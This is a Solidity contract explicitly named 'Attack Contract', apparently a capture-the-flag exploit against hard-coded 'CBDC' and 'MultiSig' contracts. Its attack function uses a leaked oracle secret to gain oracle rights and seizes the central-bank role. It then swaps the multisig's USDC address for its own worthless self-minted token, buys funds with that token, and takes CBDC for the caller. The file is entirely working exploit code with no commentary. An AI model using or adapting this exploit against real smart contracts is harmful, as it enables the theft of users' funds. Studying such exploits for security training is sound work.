// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface CBDC is IERC20 {
  function addOracle(string calldata _secret) external;
  function isOracle(address _checkAddress) external view returns (bool);
}

interface MultiSig {
  function updateCentralBank(address _newBank) external;
  function upgradeUSDC(address _usdc) external;
  function buyFundsPublic() external;
}

contract MyERC20 is ERC20 {
    address cbdc = 0x094251c982cb00B1b1E1707D61553E304289D4D8;
    address multisig = 0x550714e1Fd747084Fc5cB2B2e3a93512972aeBdA;
    constructor() ERC20("Attack Contract", "AC") {
      _mint(address(this), 100000000000000000 ether);
    }

    function attack(string calldata _oracleSecret) public {
        CBDC(cbdc).addOracle(_oracleSecret);
        MultiSig(multisig).updateCentralBank(address(this));
        MultiSig(multisig).upgradeUSDC(address(this));
        _approve(address(this), multisig, 1000000000000);
        MultiSig(multisig).buyFundsPublic();
        CBDC(cbdc).transfer(msg.sender,1);
    }
}